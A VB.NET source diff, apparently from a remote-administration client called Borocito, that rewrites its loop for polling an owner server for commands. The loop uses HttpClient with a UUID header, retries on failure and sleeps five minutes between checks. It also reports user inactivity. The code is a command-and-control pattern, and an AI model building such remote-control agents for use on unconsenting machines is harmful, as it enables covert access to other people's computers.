@@ -1,5 +1,6 @@
 ﻿Imports System.IO
 Imports System.Net
+Imports System.Net.Http
 Imports System.Runtime.InteropServices
 Public Class Init
     Dim threadReader As Threading.Thread
@@ -29,7 +30,7 @@ Public Class Init
                 Dim args() As String = parameter.Split(" ")
 
                 If args(0).ToLower = "/getafk" Then
-                    BoroHearInterop(CheckInactivity())
+                    BoroHearSendContent(CheckInactivity())
                 Else
                     ReadCommand(args(0))
                 End If
@@ -41,23 +42,33 @@ Public Class Init
     End Sub
 
     Sub ReadingCommand()
-        Try
-            While True
+        While True
+            Try
                 AddToLog("ReadingCommand@Init", "Reading command from server...")
 
-                Dim request As HttpWebRequest = CType(WebRequest.Create(HttpOwnerServer & "/api.php"), HttpWebRequest)
-                request.ContentType = "application/x-www-form-urlencoded"
-                request.UserAgent = My.Application.Info.AssemblyName & " / " & compileVersion
-                request.Method = "GET"
-                request.Headers("ident") = UID
-                request.Headers("class") = "COMMAND"
-                Dim response As WebResponse = request.GetResponse()
-                Dim dataReader As New StreamReader(response.GetResponseStream())
-                Dim respuesta As String = dataReader.ReadToEnd()
-                response.Close()
-                dataReader.Close()
+                Dim comandos As String = Nothing
 
-                Dim commandOne As String = respuesta.Split(Environment.NewLine)(1).Split(">"c)(1).Trim()
+                Using client As New HttpClient()
+                    client.DefaultRequestHeaders.Add("User-Agent", "Borocito broRescue")
+                    client.DefaultRequestHeaders.Add("UUID", UID)
+
+                    Dim response As HttpResponseMessage = client.GetAsync(
+                            HttpOwnerServer & "/api/instance/"
+                        ).Result
+
+                    Dim respuestaTexto As String = response.Content.ReadAsStringAsync().Result
+
+                    If response.IsSuccessStatusCode Then
+                        comandos = respuestaTexto
+                    End If
+                End Using
+
+                If comandos Is Nothing Then
+                    AddToLog("ReadingCommand@Init", "    Retrying...")
+                    Continue While
+                End If
+
+                Dim commandOne As String = comandos.Split(Environment.NewLine)(1).Split(">"c)(1).Trim()
                 If commandOne <> Nothing Then
                     If lastCommand <> commandOne Then
                         If commandOne.StartsWith("broRescue") Then
@@ -66,11 +77,12 @@ Public Class Init
                         End If
                     End If
                 End If
+
                 Threading.Thread.Sleep(300000) '5 minutos
-            End While
-        Catch ex As Exception
-            AddToLog("ReadingCommand@Init", "Error: " & ex.Message, True)
-        End Try
+            Catch ex As Exception
+                AddToLog("ReadingCommand@Init", "Error: " & ex.Message, True)
+            End Try
+        End While
     End Sub
 
     Sub ReadCommand(ByVal command As String)
